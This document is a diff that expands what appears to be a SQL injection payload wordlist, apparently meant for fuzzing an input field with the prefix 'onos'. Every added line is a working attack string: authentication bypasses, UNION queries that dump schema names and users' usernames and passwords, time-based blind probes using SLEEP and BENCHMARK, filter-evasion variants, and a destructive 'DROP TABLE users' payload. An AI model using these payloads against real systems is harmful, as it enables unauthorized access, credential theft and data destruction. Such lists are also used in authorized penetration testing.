@@ -1,5 +1,56 @@
-onos' OR 1=1--
-'OR '' = '
+onos' OR 1=1-- 
+' OR '1'='1-- 
+' OR 1=1#
+' OR '1'='1'/*
 onos'--
-' union select 1, 1--
-'OR 1=1--
+' OR TRUE-- 
+' OR 'x'='x-- 
+' OR ''=''-- 
+onos' UNION SELECT null, null--
+onos' UNION SELECT 1, 'test'-- 
+onos' UNION SELECT null, table_name FROM information_schema.tables--
+onos' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--
+onos' UNION SELECT username, password FROM users--
+onos' UNION SELECT database(), version()--
+onos' AND 1=1--
+onos' AND 1=2-- 
+onos' OR EXISTS(SELECT 1)--
+onos' OR NOT EXISTS(SELECT null)--
+onos' OR LENGTH(database())>5-- 
+onos' AND SUBSTRING((SELECT @@version), 1, 1)='5'--
+onos' AND (SELECT COUNT(*) FROM users)>0--
+onos' AND 1=CAST((SELECT COUNT(*) FROM users) AS SIGNED)--
+onos' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--
+onos' OR CAST('test' AS SIGNED INTEGER)=0--
+onos' OR 1=CONVERT('1', DECIMAL)--
+onos' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--
+onos' UNION SELECT NULL, CONCAT_WS(':', table_schema, table_name) FROM information_schema.tables--
+onos' OR SLEEP(5)-- 
+onos' AND IF(1=1, SLEEP(5), 0)--
+onos' AND BENCHMARK(1000000, MD5(1))--
+onos' OR (SELECT IF(LENGTH(database())>5, SLEEP(5), 0))--
+onos' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+onos' UNION SELECT schema_name, null FROM information_schema.schemata--
+onos' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='database_name'--
+onos' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--
+onos' UNION SELECT table_schema, table_name FROM information_schema.tables--
+onos' AND (SELECT COUNT(*) FROM information_schema.tables)>10--
+onos' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_name LIKE '%user%'--
+onos' UNION SELECT 1, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%'--
+onos' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'--
+onos' UNION SELECT COUNT(*), null FROM information_schema.columns WHERE table_schema='database_name'--
+onos' OR 1=(SELECT COUNT(*) FROM users)--
+onos' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
+onos' OR (SELECT MAX(LENGTH(password)) FROM users)>10--
+onos' AND (SELECT SUM(LENGTH(password)) FROM users)=100--
+onos" OR "1"="1--
+onos' OR '1'='1'--
+onos'/**/OR/**/1=1--
+onos'||'1'||'='||'1--
+onos' OR CHAR(49)=CHAR(49)--
+onos' OR 'x'||'y'||'z'='xyz'--
+onos'-- 
+onos'/*
+onos';-- 
+onos'; DROP TABLE users;--
+onos' OR 1=1;--
